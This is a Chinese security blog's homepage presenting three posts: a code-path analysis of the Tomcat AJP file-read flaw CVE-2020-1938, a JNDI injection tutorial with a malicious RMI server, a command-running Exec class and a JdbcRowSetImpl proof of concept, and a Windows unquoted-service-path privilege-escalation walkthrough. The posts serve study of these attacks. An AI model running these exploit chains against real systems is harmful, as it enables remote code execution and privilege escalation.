@@ -1,0 +1,2168 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta property="og:type" content="website">
+<meta property="og:title" content="D_infinite的小站">
+<meta property="og:url" content="http://dinfinite.cn/index.html">
+<meta property="og:site_name" content="D_infinite的小站">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="D_infinite的小站">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://dinfinite.cn/"/>
+
+
+
+
+
+  <title>D_infinite的小站</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left 
+  page-home">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">D_infinite的小站</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">不积跬步，无以至千里。</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tag"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+  <section id="posts" class="posts-expand">
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://dinfinite.cn/2021/01/19/CVE-2020-1938(Tomcat AJP)漏洞分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="D_infinite">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="D_infinite的小站">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2021/01/19/CVE-2020-1938(Tomcat AJP)漏洞分析/" itemprop="url">CVE-2020-1938(Tomcat AJP)漏洞分析</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-01-19T11:17:00+08:00">
+                2021-01-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>Apache Tomcat服务器通过Connector连接器组件与客户程序建立连接，Connector表示接收请求并返回响应的端点。即Connector组件负责接收客户的请求，以及把Tomcat服务器的响应结果发送给客户。在Apache Tomcat服务器中我们平时用的最多的8080端口，就是所谓的Http Connector，使用Http（HTTP/1.1）协议</p>
+<p>在conf/server.xml文件里，他对应的配置为<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">"8080"</span> <span class="attr">protocol</span>=<span class="string">"HTTP/1.1"</span> <span class="attr">connectionTimeout</span>=<span class="string">"20000"</span> <span class="attr">redirectPort</span>=<span class="string">"8443"</span> /&gt;</span></div></pre></td></tr></table></figure></p>
+<p>而 AJP Connector，它使用的是 AJP 协议（Apache Jserv Protocol）是定向包协议。因为性能原因，使用二进制格式来传输可读性文本，它能降低 HTTP 请求的处理成本，因此主要在需要集群、反向代理的场景被使用。Ajp协议对应的配置为<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">"8009"</span> <span class="attr">protocol</span>=<span class="string">"AJP/1.3"</span> <span class="attr">redirectPort</span>=<span class="string">"8443"</span> /&gt;</span></div></pre></td></tr></table></figure></p>
+<h3 id="漏洞跟进"><a href="#漏洞跟进" class="headerlink" title="漏洞跟进"></a>漏洞跟进</h3><p>Tomcat默认启动会启动8009端口，即AJP协议对应端口，其处理逻辑在<code>AjpProcessor</code>的<code>service</code>函数中<br><img src="/2021/01/19/CVE-2020-1938(Tomcat%20AJP)漏洞分析/0.png" alt="0.png" title=""><br>跟进到其中的<code>prepareRequest</code>函数<br><img src="/2021/01/19/CVE-2020-1938(Tomcat%20AJP)漏洞分析/1.png" alt="1.png" title=""><br>当执行到请求头解析阶段时，会判断<code>attributeCode</code>，假设<code>attributeCode</code>等于10，则进入到下图所示的case当中，当请求头的key不满足前三个选项时，直接讲对应的key/value写入到请求的<code>Attribute</code>中<br><img src="/2021/01/19/CVE-2020-1938(Tomcat%20AJP)漏洞分析/2.png" alt="2.png" title=""><br>紧接着回到<code>AjpProcessor</code>的<code>service</code>函数中，走到<code>getAdapter().service()</code>处，该函数往后的逻辑属于正常请求分发<br><img src="/2021/01/19/CVE-2020-1938(Tomcat%20AJP)漏洞分析/3.png" alt="3.png" title=""><br><img src="/2021/01/19/CVE-2020-1938(Tomcat%20AJP)漏洞分析/4.png" alt="4.png" title=""><br>当走到<code>ApplicationFilterChain</code>时，存在以下判断，假设请求不是http请求，则使用默认servlet进行处理<br><img src="/2021/01/19/CVE-2020-1938(Tomcat%20AJP)漏洞分析/5.png" alt="5.png" title=""><br>默认的<code>DefaultServlet</code>用于处理静态资源，其核心逻辑在<code>serveResource</code>函数中<br><img src="/2021/01/19/CVE-2020-1938(Tomcat%20AJP)漏洞分析/6.png" alt="6.png" title=""><br><img src="/2021/01/19/CVE-2020-1938(Tomcat%20AJP)漏洞分析/7.png" alt="7.png" title=""><br>跟进<code>getRelativePath</code>函数<br><img src="/2021/01/19/CVE-2020-1938(Tomcat%20AJP)漏洞分析/8.png" alt="8.png" title=""><br>发现从请求的<code>INCLUDE_PATH_INFO</code>和<code>INCLUDE_SERVLET_PATH</code>中获取路径信息并进行拼接并返回，将得到的路径获取对应的<code>resource</code>，最终读取文件<br><img src="/2021/01/19/CVE-2020-1938(Tomcat%20AJP)漏洞分析/9.png" alt="9.png" title=""></p>
+<p>路径过滤在<code>getResource</code>的过程中，会调用<code>org.apache.tomcat.util.http.RequestUtil.normalize</code>函数进行路径过滤<br><img src="/2021/01/19/CVE-2020-1938(Tomcat%20AJP)漏洞分析/10.png" alt="10.png" title=""><br>不难发现，没有办法使用诸如<code>.</code>和<code>..</code>进行路径穿越，也没办法使用绝对路径，因此只能读取tomcat的<code>ROOT</code>应用目录</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://dinfinite.cn/2020/05/09/深入理解JAVA中的JNDI注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="D_infinite">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="D_infinite的小站">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/05/09/深入理解JAVA中的JNDI注入/" itemprop="url">深入理解JAVA中的JNDI注入</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-09T17:17:23+08:00">
+                2020-05-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="什么是JNDI"><a href="#什么是JNDI" class="headerlink" title="什么是JNDI?"></a>什么是JNDI?</h2><blockquote>
+<p>简单来说，<code>JNDI</code> (Java Naming and Directory Interface) 是一组应用程序接口，它为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定位用户、网络、机器、对象和服务等各种资源。比如可以利用<code>JNDI</code>在局域网上定位一台打印机，也可以用<code>JNDI</code>来定位数据库服务或一个远程Java对象。<code>JNDI</code>底层支持<code>RMI</code>远程对象，<code>RMI</code>注册的服务可以通过JNDI接口来访问和调用。</p>
+<p><code>JNDI</code>支持多种命名和目录提供程序（Naming and Directory Providers），<code>RMI</code>注册表服务提供程序（RMI Registry Service Provider）允许通过<code>JNDI</code>应用接口对<code>RMI</code>中注册的远程对象进行访问操作。将<code>RMI</code>服务绑定到<code>JNDI</code>的一个好处是更加透明、统一和松散耦合，<code>RMI</code>客户端直接通过URL来定位一个远程对象，而且该<code>RMI</code>服务可以和包含人员，组织和网络资源等信息的企业目录链接在一起。</p>
+</blockquote>
+<img src="/2020/05/09/深入理解JAVA中的JNDI注入/1.png" alt="1.png" title="">
+<p>就个人的理解，<code>JNDI</code>相当于在<code>LDAP</code> <code>RMI</code>等服务外面再套了一层<code>API</code>，方便统一调用。</p>
+<h2 id="JNDI的注入点"><a href="#JNDI的注入点" class="headerlink" title="JNDI的注入点"></a>JNDI的注入点</h2><p>假设client端地址为<code>10.0.0.1</code>，先来看下面一段，JNDI的client端的代码<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">Context</span> <span class="built_in">context</span> = new  InitialContext()<span class="comment">;</span></div><div class="line"><span class="built_in">context</span>.lookup(providerURL)<span class="comment">;</span></div></pre></td></tr></table></figure></p>
+<p>其中<code>providerURL</code>为可控变量，此时，可以传入任意JNDI服务路径来实现注入，如<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?providerURL=rmi:<span class="comment">//10.0.0.2:9527/evil</span></div></pre></td></tr></table></figure></p>
+<p>但是问题来了，此时即使执行了evil所绑定的类，依然是在<code>10.0.0.2</code>上执行，无法影响到<code>10.0.0.1</code>，因此要引入一个新的概念</p>
+<h2 id="JNDI-References"><a href="#JNDI-References" class="headerlink" title="JNDI References"></a>JNDI References</h2><blockquote>
+<p>在JNDI服务中，RMI服务端除了直接绑定远程对象之外，还可以通过References类来绑定一个外部的远程对象（当前名称目录系统之外的对象）。绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在lookup()查找这个远程对象时，客户端会获取相应的object factory，最终通过factory类将reference转换为具体的对象实例。</p>
+</blockquote>
+<p>通过查阅References的源码，可以得知，其主要记录了如下信息<br><figure class="highlight lasso"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">protected</span> <span class="built_in">String</span> className;</div><div class="line"><span class="keyword">protected</span> Vector&lt;RefAddr&gt; addrs = <span class="built_in">null</span>;</div><div class="line"><span class="keyword">protected</span> <span class="built_in">String</span> classFactory = <span class="built_in">null</span>;</div><div class="line"><span class="keyword">protected</span> <span class="built_in">String</span> classFactoryLocation = <span class="built_in">null</span>;</div></pre></td></tr></table></figure></p>
+<p>其中<code>classFactoryLocation</code>实际上是<code>LDAP</code>或者<code>RMI</code>的地址</p>
+<h2 id="真正的JNDI注入"><a href="#真正的JNDI注入" class="headerlink" title="真正的JNDI注入"></a>真正的JNDI注入</h2><p>假设server地址为<code>10.0.0.2</code>，构造如下恶意<code>RMI</code>服务代码<br><figure class="highlight gauss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Registry registry = LocateRegistry.createRegistry(<span class="number">9527</span>);</div><div class="line">Reference <span class="built_in">exec</span> = <span class="keyword">new</span> Reference(<span class="string">"Exec"</span>, <span class="string">"Exec"</span>, <span class="string">"http://127.0.0.1:8080/"</span>);</div><div class="line">ReferenceWrapper refWrap = <span class="keyword">new</span> ReferenceWrapper(<span class="built_in">exec</span>);</div><div class="line"><span class="keyword">System</span>.out.println(<span class="string">"Binding 'refObjWrapper' to 'rmi://127.0.0.1:9527/exec"</span>);</div><div class="line">registry.bind(<span class="string">"exec"</span>, refWrap);</div></pre></td></tr></table></figure></p>
+<p>上述代码非常简单，主要是将<code>/exec</code>这个路径绑定到一个<code>Reference</code>上，而这个<code>Reference</code>指向<code>127.0.0.1:8080/Exec.class</code>,其中<code>Reference</code>的构造函数第一个参数是<code>className</code>,第二个参数是<code>classFactory</code></p>
+<p>紧接着让我们构造<code>Exec</code>这个恶意类<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</div><div class="line"><span class="keyword">import</span> java.io.InputStream;</div><div class="line"><span class="keyword">import</span> java.io.InputStreamReader;</div><div class="line"><span class="keyword">import</span> java.io.OutputStream;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="keyword">class</span> Exec &#123;</div><div class="line">    <span class="keyword">public</span> Exec() throws Exception&#123;</div><div class="line">        <span class="keyword">String</span> cmd = <span class="string">"whoami"</span>;</div><div class="line">        <span class="built_in">Process</span> p = Runtime.getRuntime().exec(cmd);</div><div class="line">        InputStream is = p.getInputStream();</div><div class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</div><div class="line"></div><div class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</div><div class="line">        <span class="keyword">int</span> a = <span class="number">-1</span>;</div><div class="line">        <span class="built_in">while</span> ((a = is.<span class="built_in">read</span>(b)) != <span class="number">-1</span>)&#123;</div><div class="line">            baos.<span class="built_in">write</span>(b, <span class="number">0</span>, a);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        System.out.<span class="built_in">println</span>(<span class="keyword">new</span> <span class="keyword">String</span>(baos.toByteArray()));</div><div class="line"></div><div class="line">        p.waitFor();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>将其编译为<code>Exec.class</code>文件，然后拷贝到web目录下<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">javac</span> <span class="selector-tag">Exec</span><span class="selector-class">.java</span></div></pre></td></tr></table></figure></p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cp Exec.<span class="keyword">class</span> <span class="regexp">/var/</span>www<span class="regexp">/html/</span></div></pre></td></tr></table></figure>
+<p>假设client地址为<code>10.0.0.1</code>，构造如下漏洞代码<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">System.setProperty(<span class="string">"java.rmi.server.useCodebaseOnly"</span>, <span class="string">"false"</span>)<span class="comment">;</span></div><div class="line">System.setProperty(<span class="string">"com.sun.jndi.rmi.object.trustURLCodebase"</span>, <span class="string">"true"</span>)<span class="comment">;</span></div><div class="line"><span class="built_in">Context</span> <span class="built_in">context</span> = new  InitialContext()<span class="comment">;</span></div><div class="line"><span class="built_in">context</span>.lookup(<span class="string">"rmi://127.0.0.1/exec"</span>)<span class="comment">;</span></div></pre></td></tr></table></figure></p>
+<p>即可成功执行<code>whoami</code>命令<br><img src="/2020/05/09/深入理解JAVA中的JNDI注入/2.png" alt="2.png" title=""><br>其中前两行代码主要用于解除安全限制</p>
+<blockquote>
+<p>在RMI服务中引用远程对象将受本地Java环境限制即本地的java.rmi.server.useCodebaseOnly配置必须为false(允许加载远程对象)，如果该值为true则禁止引用远程对象。除此之外被引用的ObjectFactory对象还将受到com.sun.jndi.rmi.object.trustURLCodebase配置限制，如果该值为false(不信任远程引用对象)一样无法调用远程的引用对象。</p>
+<p>JDK 5 U45,JDK 6 U45,JDK 7u21,JDK 8u121开始java.rmi.server.useCodebaseOnly默认配置已经改为了true。</p>
+<p>JDK 6u132, JDK 7u122, JDK 8u113开始com.sun.jndi.rmi.object.trustURLCodebase默认值已改为了false。</p>
+</blockquote>
+<h2 id="深入源码探索"><a href="#深入源码探索" class="headerlink" title="深入源码探索"></a>深入源码探索</h2><p>前面提到了，实际原因是触发了object factory，下面我们来看一下具体的触发调用链<br><img src="/2020/05/09/深入理解JAVA中的JNDI注入/3.png" alt="3.png" title=""><br>核心代码触发代码从<code>decodeObject</code>开始<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">var1</span>为传入的remote接口对象</div><div class="line">Object var3 = <span class="built_in">var1</span> instanceof RemoteReference ? ((RemoteReference)<span class="built_in">var1</span>).getReference() : <span class="built_in">var1</span>;</div></pre></td></tr></table></figure></p>
+<p>在<code>decodeObject</code>中，会判断传入对象是满足<code>RemoteReference</code>接口，满足则通过<code>getReference</code>函数获取<code>reference</code>对象，然后进入<code>getObjectInstance</code>函数<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (<span class="keyword">ref</span> != <span class="literal">null</span>) &#123;</div><div class="line">            String f = <span class="keyword">ref</span>.getFactoryClassName();</div><div class="line">            <span class="keyword">if</span> (f != <span class="literal">null</span>) &#123;</div><div class="line">                <span class="comment">// if reference identifies a factory, use exclusively</span></div><div class="line"></div><div class="line">                factory = getObjectFactoryFromReference(<span class="keyword">ref</span>, f); <span class="comment">//触发点1</span></div><div class="line">                <span class="keyword">if</span> (factory != <span class="literal">null</span>) &#123;</div><div class="line">                    <span class="keyword">return</span> factory.getObjectInstance(<span class="keyword">ref</span>, name, nameCtx,</div><div class="line">                                                     environment); <span class="comment">//触发点2</span></div><div class="line">                &#125;</div><div class="line">                <span class="comment">// No factory found, so return original refInfo.</span></div><div class="line">                <span class="comment">// Will reach this point if factory class is not in</span></div><div class="line">                <span class="comment">// class path and reference does not contain a URL for it</span></div><div class="line">                <span class="keyword">return</span> refInfo;</div></pre></td></tr></table></figure></p>
+<p>在<code>getObjectInstance</code>函数中，一共有两处可执行<code>RMI</code>中定义的恶意代码的地方，一处是<code>getObjectFactoryFromReference</code>，在<code>getObjectFactoryFromReference</code>中会通过获取到对应的<code>Class</code>对象，通过<code>clas.newInstance()</code>触发恶意构造函数<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">return</span> (clas != null) ? (ObjectFactory) clas.newInstance() : <span class="keyword"><span class="keyword">null</span></span>;</div></pre></td></tr></table></figure></p>
+<p>另外一处，则是通过实例化的类，调用其<code>getObjectInstance</code>函数，只要我们实现了<code>ObjectFactory</code>接口，复写<code>getObjectInstance</code>函数，即可执行恶意代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exec</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exec</span><span class="params">()</span></span>&#123;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">        System.out.println(<span class="string">"factory.getObjectInstance hook!"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h2 id="JdbcRowSetImpl的JNDI注入利用链"><a href="#JdbcRowSetImpl的JNDI注入利用链" class="headerlink" title="JdbcRowSetImpl的JNDI注入利用链"></a>JdbcRowSetImpl的JNDI注入利用链</h2><p>在实战过程中，<code>context.lookup</code>直接被外部调用的情况比较少，但是我们可以通过间接调用<code>context.lookup</code>实现JNDI的注入，<code>JdbcRowSetImpl</code>就是这样一条利用链，先来看一下最终的POC<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">System.setProperty(<span class="string">"com.sun.jndi.rmi.object.trustURLCodebase"</span>, <span class="string">"true"</span>)<span class="comment">;</span></div><div class="line"><span class="keyword">JdbcRowSetImpl </span><span class="keyword">j </span>= new <span class="keyword">JdbcRowSetImpl();</span></div><div class="line"><span class="keyword">j.setDataSourceName("rmi://127.0.0.1:9527/exec");</span></div><div class="line"><span class="keyword">j.setAutoCommit(true);</span></div></pre></td></tr></table></figure></p>
+<p>调用链如下<br><img src="/2020/05/09/深入理解JAVA中的JNDI注入/4.png" alt="4.png" title=""><br>可以看到，唯一的不同在于<code>lookup</code>前调用了<code>setAutoCommit</code>以及<code>connect</code>方法</p>
+<h2 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h2><p>1.在POC复现的过程中，由于编译<code>Exec</code>使用了1.8，运行<code>Server</code>以及<code>Client</code>使用了1.7，导致无法运行。由于JAVA版本向下兼容，因此实际利用过程中，建议使用1.6编译<code>Exec.class</code>，笔者偷懒，均采用了1.8</p>
+<p>2.<code>Exec</code>的声明不能带package，否则无法触发，具体原因仍未查明。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://dinfinite.cn/2020/03/16/Windows下常见提权方式/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="D_infinite">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="D_infinite的小站">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/03/16/Windows下常见提权方式/" itemprop="url">Windows下常见提权方式</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-16T11:38:51+08:00">
+                2020-03-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="服务路径"><a href="#服务路径" class="headerlink" title="服务路径"></a>服务路径</h2><p><a href="https://www.anquanke.com/post/id/85377" target="_blank" rel="external">漏洞复现</a><br>1.搜索存在问题路径<br><figure class="highlight coq"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic service get name,displayname,pathname,startmode |<span class="type">findstr</span> /i <span class="string">"Auto"</span> |<span class="type">findstr</span> /i /v <span class="string">"C:\Windows\\"</span> |<span class="type">findstr</span> /i /v <span class="string">""</span><span class="string">"</span></div></pre></td></tr></table></figure></p>
+<p>2.当存在空格时，会产生如下调用<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">C:<span class="string">\Vuln</span> Service<span class="string">\execute.exe</span></div><div class="line">C:<span class="string">\Vuln.exe</span></div></pre></td></tr></table></figure></p>
+<p>原理为windows无法识别空格的含义，因此会进行程序搜索</p>
+<p>3.编写恶意程序Vuln.exe，放入C:\下<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sc <span class="literal">start</span> <span class="string">"Vuln Service"</span></div></pre></td></tr></table></figure></p>
+<p>即可触发，但存在以下问题，自行添加的<a href="https://devops.osichina.net/2017/06/18/%E7%AC%AC2%E5%91%A8%20windows%E8%87%AA%E5%AE%9A%E4%B9%89%E7%A8%8B%E5%BA%8F%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8/" target="_blank" rel="external">服务无法启动</a><br>实际利用过程中会有诸多限制，如目录的权限，服务无法自启动等，较为鸡肋</p>
